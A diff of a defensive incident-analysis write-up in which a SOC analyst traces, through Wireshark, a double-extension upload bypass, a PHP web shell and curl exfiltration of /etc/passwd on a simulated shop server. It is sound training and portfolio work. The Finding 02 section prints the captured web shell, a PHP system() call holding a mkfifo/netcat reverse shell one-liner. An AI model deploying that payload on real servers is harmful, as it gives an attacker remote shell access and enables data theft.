@@ -1,4 +1,4 @@
-# Security Portfolio: SOC Incident Simulation -- Operation Shadow Drop
+# SOC Incident Simulation - Operation Shadow Drop
 
 ## Unrestricted File Upload and Data Exfiltration (NetSysLink Web Server)
 
@@ -65,7 +65,7 @@ TCP stream reconstruction. Geolocation was confirmed via IP lookup at
 
 ## 4. Methodology
 
-### Phase 1 -- IP Attribution and Geolocation
+### Phase 1: IP Attribution and Geolocation
 Wireshark's Statistics > Conversations tab was opened. The PCAP contained
 traffic between only two IP addresses: `24.49.63.79` and `117.11.88.124`.
 Responses originated from `24.49.63.79`, confirming it as the web server.
@@ -74,14 +74,14 @@ address. Geolocation was verified via `whatsmyipaddress.com`, returning
 Tianjin, China (ASN 4837, China Unicom Tianjin Province Network, hostname
 `dns124.online.tj.cn`).
 
-### Phase 2 -- User-Agent Identification
+### Phase 2: User-Agent Identification
 The Wireshark display filter `http.user_agent` was applied. All HTTP requests
 from `117.11.88.124` were inspected for the User-Agent header value. A
 consistent User-Agent string was observed across all attacker requests,
 indicating either a Linux desktop environment or a spoofed browser string
 applied by an automated tool to evade WAF signature matching.
 
-### Phase 3 -- Web Shell Upload Analysis
+### Phase 3: Web Shell Upload Analysis
 The display filter `http.request.method == "POST"` was applied to isolate
 file upload requests. Two POST packets were identified. The first contained
 a file named `image.php` and the server returned "Invalid file format." The
@@ -90,14 +90,14 @@ second contained a file named `image.jpg.php` and the server returned
 followed to extract the full request including the PHP payload embedded in
 the file body.
 
-### Phase 4 -- Upload Directory Identification
+### Phase 4: Upload Directory Identification
 The display filter `http.request.method == "GET"` was applied after the upload
 event timestamp. GET requests in the packets following the upload revealed
 the attacker attempting to trigger the web shell via a direct HTTP GET to
 `/reviews/uploads/image.jpg.php`, confirming the upload directory as
 `/reviews/uploads/`.
 
-### Phase 5 -- Outbound Communication Analysis
+### Phase 5: Outbound Communication Analysis
 The web shell payload content was extracted from the upload stream and
 inspected. The PHP `system()` call embedded a Netcat reverse shell command
 instructing the server to initiate an outbound TCP connection to
@@ -105,7 +105,7 @@ instructing the server to initiate an outbound TCP connection to
 to isolate this traffic and the TCP streams were followed to confirm the
 reverse shell session and identify commands executed.
 
-### Phase 6 -- Exfiltration Method Analysis
+### Phase 6: Exfiltration Method Analysis
 TCP streams on port 8080 were followed to reconstruct the attacker's
 interactive shell session. The commands revealed the attacker used `curl`
 to POST the `/etc/passwd` file to a web address hosted on the attacker's
@@ -118,9 +118,9 @@ as standard HTTPS traffic, which most firewalls allow outbound by default.
 
 | ID | Vulnerability | Severity | Affected Endpoint |
 |----|--------------|----------|-------------------|
-| 01 | Unrestricted File Upload -- Double Extension Bypass | Critical | /reviews/upload.php |
+| 01 | Unrestricted File Upload: Double Extension Bypass | Critical | /reviews/upload.php |
 | 02 | Web Shell Remote Code Execution | Critical | /reviews/uploads/image.jpg.php |
-| 03 | Data Exfiltration via curl over Port 443 | Critical | Server filesystem -- /etc/passwd |
+| 03 | Data Exfiltration via curl over Port 443 | Critical | Server filesystem: /etc/passwd |
 | 04 | Upload Directory Web-Accessible with Script Execution Enabled | Critical | /reviews/uploads/ |
 | 05 | No Egress Filtering on Outbound TCP Port 8080 | High | Server network configuration |
 | 06 | Server Version Disclosure via HTTP Response Headers | Medium | All HTTP responses |
@@ -131,13 +131,13 @@ as standard HTTPS traffic, which most firewalls allow outbound by default.
 
 ---
 
-### Finding 01 -- Unrestricted File Upload via Double Extension Bypass
+### Finding 01: Unrestricted File Upload via Double Extension Bypass
 
 #### Severity
 Critical
 
 #### Affected Endpoint
-`/reviews/upload.php` -- POST, `uploadedFile` field
+`/reviews/upload.php`: POST, `uploadedFile` field
 
 #### Description
 The file upload endpoint on `shoporoma.com` applied a filter to reject files
@@ -152,19 +152,9 @@ and remained directly executable via HTTP GET.
 
 #### Proof of Concept
 
-First upload attempt with `image.php` -- rejected by the server:
+Second upload attempt with `image.jpg.php`: accepted by the server:
 
-
-
-![Wireshark - First POST Upload of image.php Rejected with Invalid file format](image.jpg)
-
-
-
-Second upload attempt with `image.jpg.php` -- accepted by the server:
-
-
-
-![Wireshark - Second POST Upload of image.jpg.php Accepted with File uploaded successfully](image.jpg)
+![Wireshark - Second POST Upload of image.jpg.php Accepted with File uploaded successfully](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_01%20Wireshark%20-%20Second%20POST%20Upload%20of%20image.jpg.php%20Accepted%20with%20File%20uploaded%20successfully.jpg)
 
 
 
@@ -193,39 +183,23 @@ means any double extension, triple extension, or alternate PHP extension
 (`.phtml`, `.phar`, `.php5`) bypasses the same filter with equal ease.
 
 #### Remediation
-Reject any file where the extracted terminal extension is an executable type.
+- Reject any file where the extracted terminal extension is an executable type.
 The validation logic must evaluate the last extension after the final dot, not
 the first extension or the presence of a permitted extension anywhere in the
-filename:
-```php
-$filename = $_FILES['uploadedFile']['name'];
-$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-$allowed = ['jpg', 'jpeg', 'png', 'gif'];
-if (!in_array($ext, $allowed)) {
-    die("File type not permitted.");
-}
-```
-
-Additionally, validate file content using magic byte inspection via
+filename.
+- Additionally, validate file content using magic byte inspection via
 `finfo_file()` rather than trusting the filename or client-supplied
-`Content-Type` header:
-```php
-$finfo = finfo_open(FILEINFO_MIME_TYPE);
-$mime = finfo_file($finfo, $_FILES['uploadedFile']['tmp_name']);
-if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
-    die("File content does not match a permitted image type.");
-}
-```
+`Content-Type` header
 
 ---
 
-### Finding 02 -- Web Shell Remote Code Execution
+### Finding 02: Web Shell Remote Code Execution
 
 #### Severity
 Critical
 
 #### Affected Endpoint
-`/reviews/uploads/image.jpg.php` -- HTTP GET
+`/reviews/uploads/image.jpg.php`: HTTP GET
 
 #### Description
 The uploaded file `image.jpg.php` contained a PHP reverse shell one-liner.
@@ -239,14 +213,6 @@ account.
 
 #### Proof of Concept
 
-Wireshark GET request showing the attacker triggering the uploaded web shell:
-
-
-
-![Wireshark - GET /reviews/uploads/image.jpg.php Triggering Shell Execution](image.jpg)
-
-
-
 Web shell payload content from the upload stream:
 ```php
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
@@ -257,8 +223,7 @@ TCP stream on port 8080 reconstructing the interactive shell session with
 attacker commands visible:
 
 
-
-![Wireshark TCP Stream Port 8080 - Interactive Shell Commands: whoami, uname -a, pwd, cat /etc/passwd](image.jpg)
+![Wireshark TCP Stream Port 8080 - Interactive Shell Commands: whoami, uname -a, pwd, cat /etc/passwd](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_02%20Wireshark%20TCP%20Stream%20Port%208080%20-%20Interactive%20Shell%20Commands%20curl%20etc-passwd.jpg)
 
 
 
@@ -279,29 +244,22 @@ as a pivot point into the internal network. The shell persists until the
 file is removed from disk and active TCP connections are terminated.
 
 #### Remediation
-Remove `image.jpg.php` from `/reviews/uploads/` immediately. Audit the full
+- Remove `image.jpg.php` from `/reviews/uploads/` immediately. Audit the full
 upload directory for any other files created during the same session. Disable
-PHP execution in the upload directory using `.htaccess`:
-```
-php_flag engine off
-Options -ExecCGI
-<FilesMatch "\.(php|phtml|phar|php5)$">
-    Deny from all
-</FilesMatch>
-```
-Store uploaded files outside the web root to prevent HTTP access to stored
+PHP execution in the upload directory using `.htaccess`
+- Store uploaded files outside the web root to prevent HTTP access to stored
 files entirely. Implement file integrity monitoring (FIM) on the upload
 directory to alert on any new file creation, particularly PHP files.
 
 ---
 
-### Finding 03 -- /etc/passwd Exfiltrated via curl over Port 443
+### Finding 03: /etc/passwd Exfiltrated via curl over Port 443
 
 #### Severity
 Critical
 
 #### Affected Component
-Server filesystem -- `/etc/passwd`, exfiltrated to attacker infrastructure
+Server filesystem: `/etc/passwd`, exfiltrated to attacker infrastructure
 
 #### Description
 During the reverse shell session, the attacker ran `cat /etc/passwd` to
@@ -319,7 +277,7 @@ and the `/etc/passwd` content returning through the shell session:
 
 
 
-![Wireshark TCP Stream - cat /etc/passwd Command and Response Including User Account Lines](image.jpg)
+![Wireshark TCP Stream - cat /etc/passwd Command and Response Including User Account Lines](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_02%20Wireshark%20TCP%20Stream%20Port%208080%20-%20Interactive%20Shell%20Commands%20curl%20etc-passwd.jpg)
 
 
 
@@ -354,29 +312,25 @@ for SSH brute force attempts against known valid usernames. The use of port
 attacker had prior knowledge of the network's egress filtering configuration.
 
 #### Remediation
-Implement egress filtering on the web server that restricts outbound
+- Implement egress filtering on the web server that restricts outbound
 connections to explicitly permitted destinations and ports only. The web
 server process account (`www-data`) should not be permitted to initiate
 outbound connections to arbitrary external IP addresses on any port,
 including 443. A host-based firewall rule restricting outbound traffic from
-the Apache process can be applied using `iptables` with UID-based filtering:
-
-```bash
-iptables -A OUTPUT -m owner --uid-owner www-data -d 117.11.88.124 -j DROP
-```
-Monitor outbound connections from the web server for anomalies such as
+the Apache process can be applied using `iptables` with UID-based filtering
+- Monitor outbound connections from the web server for anomalies such as
 connections to non-whitelisted external IPs, particularly on ports 443 and
 8080 from a web server process.
 
 ---
 
-### Finding 04 -- Upload Directory Web-Accessible with Script Execution Enabled
+### Finding 04: Upload Directory Web-Accessible with Script Execution Enabled
 
 #### Severity
 Critical
 
 #### Affected Component
-`/reviews/uploads/` -- Web-accessible directory, PHP execution permitted
+`/reviews/uploads/`: Web-accessible directory, PHP execution permitted
 
 #### Description
 The directory where the web application stores uploaded files is directly
@@ -394,7 +348,7 @@ web-accessible and PHP execution is active:
 
 
 
-![Wireshark - GET /reviews/uploads/image.jpg.php Returning PHP Execution Output](image.jpg)
+![Wireshark - GET /reviews/uploads/image.jpg.php Returning PHP Execution Output](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_03%20Wireshark%20-%20GET%20reviews-uploads-image.jpg.php%20Returning%20PHP%20Execution%20Output.jpg)
 
 
 
@@ -407,37 +361,30 @@ Referer: http://shoporoma.com/reviews/uploads/
 
 #### Impact
 A web-accessible upload directory with PHP execution enabled means any PHP
-file that reaches the directory -- regardless of the bypass technique used to
-get it there -- becomes immediately executable. This is the condition that
+file that reaches the directory, regardless of the bypass technique used to
+get it there, becomes immediately executable. This is the condition that
 converts a file upload vulnerability into remote code execution. Removing
 this condition at the infrastructure level limits the impact of any upload
 bypass that may be found in the future.
 
 #### Remediation
-Store uploaded files in a directory outside the web root that cannot be
+- Store uploaded files in a directory outside the web root that cannot be
 accessed via HTTP. If files must remain inside the web root (for example,
 to serve uploaded images to visitors), add an `.htaccess` file in the
-uploads directory that disables all script execution:
-```apache
-Options -ExecCGI
-php_flag engine off
-<FilesMatch "\.">
-    SetHandler default-handler
-</FilesMatch>
-```
-Rename all uploaded files server-side to randomly generated strings with a
+uploads directory that disables all script execution
+- Rename all uploaded files server-side to randomly generated strings with a
 forced safe extension (e.g., a UUID with `.jpg`), removing the original
 filename from the stored path entirely.
 
 ---
 
-### Finding 05 -- No Egress Filtering on TCP Port 8080
+### Finding 05: No Egress Filtering on TCP Port 8080
 
 #### Severity
 High
 
 #### Affected Component
-Server network configuration -- outbound TCP port 8080
+Server network configuration: outbound TCP port 8080
 
 #### Description
 The web server was permitted to initiate outbound TCP connections to
@@ -463,7 +410,7 @@ and interactive shell commands were exchanged:
 
 
 
-![Wireshark - TCP Port 8080 Stream Confirming Reverse Shell Session Established](image.jpg)
+![Wireshark - TCP Port 8080 Stream Confirming Reverse Shell Session Established](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_04%20Wireshark%20-%20TCP%20Port%208080%20Stream%20Confirming%20Reverse%20Shell%20Session%20Established.jpg)
 
 
 
@@ -476,29 +423,22 @@ server's IP would have prevented the shell from establishing even after the
 file was uploaded and triggered.
 
 #### Remediation
-Configure a host-based firewall on the web server using `iptables` or
+- Configure a host-based firewall on the web server using `iptables` or
 `ufw` to permit outbound traffic only to explicitly needed destinations
 and ports (typically ports 80, 443, and 53 to defined upstream addresses).
-Block all other outbound connections by default:
-```bash
-ufw default deny outgoing
-ufw allow out 80/tcp
-ufw allow out 443/tcp
-ufw allow out 53/udp
-ufw enable
-```
-Implement network-level egress filtering at the perimeter to enforce the
+Block all other outbound connections by default
+- Implement network-level egress filtering at the perimeter to enforce the
 same policy from outside the host.
 
 ---
 
-### Finding 06 -- Server Version Disclosure via HTTP Response Headers
+### Finding 06: Server Version Disclosure via HTTP Response Headers
 
 #### Severity
 Medium
 
 #### Affected Component
-HTTP response headers -- all responses from `shoporoma.com`
+HTTP response headers: all responses from `shoporoma.com`
 
 #### Description
 Every HTTP response from the server included the `Server` header identifying
@@ -535,8 +475,8 @@ Update Apache to the current supported stable release.
 | Timestamp (UTC) | Phase | Action | Evidence |
 |-----------------|-------|--------|----------|
 | 30 Nov 2023 18:43:30 | Initial Connection | Attacker `117.11.88.124` initiates connection to server `24.49.63.79` | TCP handshake in PCAP |
-| 30 Nov 2023 18:43:57 | First Upload Attempt | `image.php` uploaded via POST -- rejected: "Invalid file format" | HTTP POST response |
-| 30 Nov 2023 18:44:19 | Second Upload Attempt | `image.jpg.php` uploaded via POST -- accepted: "File uploaded successfully" | HTTP 200, upload confirmation |
+| 30 Nov 2023 18:43:57 | First Upload Attempt | `image.php` uploaded via POST, rejected: "Invalid file format" | HTTP POST response |
+| 30 Nov 2023 18:44:19 | Second Upload Attempt | `image.jpg.php` uploaded via POST, accepted: "File uploaded successfully" | HTTP 200, upload confirmation |
 | 30 Nov 2023 18:44:52 | Web Shell Triggered | GET request to `/reviews/uploads/image.jpg.php` executes PHP payload | HTTP GET, TCP port 8080 session opens |
 | Post-18:44:52 | Reconnaissance | Attacker runs `whoami`, `uname -a`, `pwd` in interactive shell | TCP stream port 8080 |
 | Post-18:44:52 | Data Access | `cat /etc/passwd` executed, local account list read | TCP stream port 8080 |
@@ -614,8 +554,8 @@ Update Apache to the current supported stable release.
   The attacker sent `/etc/passwd` outbound over port 443. Without SSL inspection
   or anomaly-based detection, this looks identical to a normal HTTPS request.
   Egress filtering must go beyond blocking non-standard ports. Destination-based
-  allowlisting -- permitting port 443 only to known CDN, update, and API
-  endpoints -- removes this evasion technique.
+  allowlisting, permitting port 443 only to known CDN, update, and API
+  endpoints removes this evasion technique.
 - **The upload directory's executability is the real enabler:** Two separate
   controls failed to prevent this attack: the upload filter and the execution
   configuration. Even if both were independently exploitable, fixing only one
@@ -624,7 +564,7 @@ Update Apache to the current supported stable release.
   reverse shell regardless of what file the attacker managed to upload.
 - **A failed upload immediately followed by a successful one is a detectable
   signal:** "Invalid file format" at 18:43:57, then "File uploaded successfully"
-  at 18:44:19 -- a 22-second gap. A SIEM rule alerting on a failed upload
+  at 18:44:19, a 22-second gap. A SIEM rule alerting on a failed upload
   immediately followed by a successful upload from the same source IP would
   have flagged this sequence for human review before the shell was triggered.
 
